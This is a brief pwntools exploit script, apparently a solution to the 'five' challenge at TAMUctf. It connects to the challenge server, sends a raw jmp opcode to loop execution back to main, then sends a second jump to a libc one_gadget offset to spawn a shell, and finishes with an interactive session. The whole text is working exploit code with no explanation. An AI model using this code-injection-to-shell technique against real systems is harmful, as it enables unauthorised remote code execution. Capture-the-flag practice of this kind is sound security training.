from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="five")
# p = remote("localhost", 1337)

payload = b'\xe9' + p32(0xffff01a3) # jmp main
p.send(payload)

one_gadget = 0x4497f

payload = b'\xe9' + p32(0xffe3cffb + one_gadget)
p.send(payload)

p.interactive()
